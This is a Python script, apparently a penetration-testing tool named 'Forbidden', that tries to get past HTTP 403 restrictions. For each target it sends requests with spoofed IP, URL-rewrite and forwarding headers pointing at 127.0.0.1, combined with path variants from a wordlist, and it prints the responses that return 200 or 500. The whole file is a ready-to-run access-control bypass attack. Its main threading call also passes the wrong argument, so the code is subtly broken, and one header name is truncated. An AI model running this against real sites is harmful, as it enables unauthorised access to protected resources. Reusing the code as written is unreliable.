from colorama import Fore, Style
from fake_useragent import UserAgent
import concurrent.futures
import requests
import argparse
import sys
import json

banner = r"""
___________         ___.   .__    .___  .___           
\_   _____/_________\_ |__ |__| __| _/__| _/____   ____
 |    __)/  _ \_  __ \ __ \|  |/ __ |/ __ |/ __ \ /    \
 |     \(  <_> )  | \/ \_\ \  / /_/ / /_/ \  ___/|   |  \ 
 \___  / \____/|__|  |___  /__\____ \____ |\___  >___|  /
     \/                  \/        \/    \/    \/     \/    v0.1

"""

print(Fore.CYAN + banner)

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()

group.add_argument('-p', '--path', action='store',
                   type=str, help='path to check',
                   metavar='domain.com')

parser.add_argument('-d', '--domains', action='store',
                    help="domains to check",
                    metavar="filename.txt")

parser.add_argument('-t', '--target', action='store',
                    help="domain to check",
                    metavar="site.com")

parser.add_argument('-f', '--file', action='store',
                    help="file containing multiple API endpoints",
                    metavar="endpoints.txt")

args = parser.parse_args()

ua = UserAgent()


def read_wordlist(wordlist):
    try:
        with open(wordlist, 'r') as f:
            return [x.strip() for x in f.readlines()]
    except FileNotFoundError as fnf_err:
        print(f"FileNotFoundError: {fnf_err}")
        sys.exit(1)


wordlist = read_wordlist("bypasses.txt")


def get_headers(path=None):
    headers = [
        {'User-Agent': str(ua.chrome)},
        {'User-Agent': str(ua.chrome), 'X-Original-URL': path or '/'},
        {'User-Agent': str(ua.chrome), 'X-Custom-IP-Authorization': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-For': '127.0.0.1:80'},
        {'User-Agent': str(ua.chrome), 'X-Originally-Forwarded-For': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Originating-': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Originating-IP': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'True-Client-IP': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-WAP-Profile': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Arbitrary': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-HTTP-DestinationURL': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Proto': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'Destination': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Remote-IP': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Client-IP': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Host': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-Forwarded-Host': 'http://127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-ProxyUser-Ip': '127.0.0.1'},
        {'User-Agent': str(ua.chrome), 'X-rewrite-url': path or '/'}
    ]
    return headers


def do_request(url, stream=False, path=None):
    headers = get_headers(path=path)
    try:
        for header in headers:
            if stream:
                r = requests.get(url, stream=True, headers=header)
            else:
                r = requests.get(url, headers=header)
            if r.status_code == 200 or r.status_code == 500:
                status_color = Fore.GREEN if r.status_code == 200 else Fore.RED
                print(
                    f"{Fore.WHITE}{url} {json.dumps(list(header.items())[-1])} {status_color}[{r.status_code}]{Style.RESET_ALL}")
    except requests.exceptions.RequestException as err:
        print("Some Ambiguous Exception:", err)


def main(wordlist):
    if args.domains:
        if args.path:
            print(Fore.CYAN + "Checking domains to bypass....")
            checklist = read_wordlist(args.domains)
            for line in checklist:
                for bypass in wordlist:
                    links = f"{line}/{args.path}{bypass}"
                    do_request(links, stream=True, path=args.path)
        else:
            print(Fore.CYAN + "Checking domains to bypass....")
            checklist = read_wordlist(args.domains)
            for line in checklist:
                for bypass in wordlist:
                    links = f"{line}{bypass}"
                    do_request(links, stream=True)
    elif args.file:
        if args.path:
            print(Fore.CYAN + "Checking endpoints to bypass....")
            endpoints = read_wordlist(args.file)
            for endpoint in endpoints:
                for bypass in wordlist:
                    links = f"{endpoint}/{args.path}{bypass}"
                    do_request(links, stream=True, path=args.path)
        else:
            print(Fore.CYAN + "Checking endpoints to bypass....")
            endpoints = read_wordlist(args.file)
            for endpoint in endpoints:
                for bypass in wordlist:
                    links = f"{endpoint}{bypass}"
                    do_request(links, stream=True)
    if args.target:
        if args.path:
            print(Fore.GREEN + f"Checking {args.target}...")
            for bypass in wordlist:
                links = f"{args.target}/{args.path}{bypass}"
                do_request(links, path=args.path)
        else:
            print(Fore.GREEN + f"Checking {args.target}...")
            for bypass in wordlist:
                links = f"{args.target}{bypass}"
                do_request(links)


if __name__ == "__main__":
    try:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.map(main, wordlist)
    except KeyboardInterrupt:
        sys.exit(0)

